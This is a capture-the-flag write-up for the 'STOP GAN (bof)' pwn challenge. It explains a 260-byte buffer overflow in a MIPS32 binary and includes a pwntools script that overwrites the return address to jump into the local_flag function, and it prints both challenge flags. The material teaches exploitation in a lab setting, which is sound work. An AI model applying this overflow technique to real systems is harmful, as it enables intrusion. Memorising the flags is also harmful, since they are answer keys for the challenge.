[../](../../)

# STOP GAN (bof)

## pwn

> Success, you've gotten the picture of your lost love, not knowing that pictures and the things you take pictures of are generally two seperate things, you think you've rescue them and their brethren by downloading them all to your ships hard drive. They're still being eaten, but this is a fact that has escaped you entirely. Your thoughts swiftly shift to revenge. It's important now to stop this program from destroying these "Cauliflowers" as they're referred to, ever again.
>
> buffer-overflow.ctfcompetition.com 1337
>
> [4a8becb637ed2b45e247d482ea9df123eb01115fc33583c2fa0e4a69b760af4a](4a8becb637ed2b45e247d482ea9df123eb01115fc33583c2fa0e4a69b760af4a)

You are given two binaries, the first one is a MIPS32 binary and the second one is simply a helper program to start the MIPS binary with `QEMU`.

The binary lets you input something into a buffer with a size of 260, so in order to crash the system, you have to input like 268 arbitrary characters to overwrite the `RIP` what leads to a segfault. Since the binary has a segfault handler, it then prints the first flag.

flag: `CTF{Why_does_cauliflower_threaten_us}`

The helper binary gives the hint, that you get another flag for controlling the overflow. So now we have to prepare our input and carefully overwrite the `RIP` with an address we want to jump to. Let's analyze the binary with `Ghidra` and see what we can do. It contains a function called `local_flag`, but we can not directly jump to it. We have to skip the first instructions.

Exploit script:

```python
from pwn import *


e = ELF('./bof')

# p = process('./bof')
p = remote('buffer-overflow.ctfcompetition.com', 1337)

p.sendline('run')
p.sendline('A' * 264 + p32(e.symbols['local_flag'] + 12))
p.interactive()
```

flag: `CTF{controlled_crash_causes_conditional_correspondence}`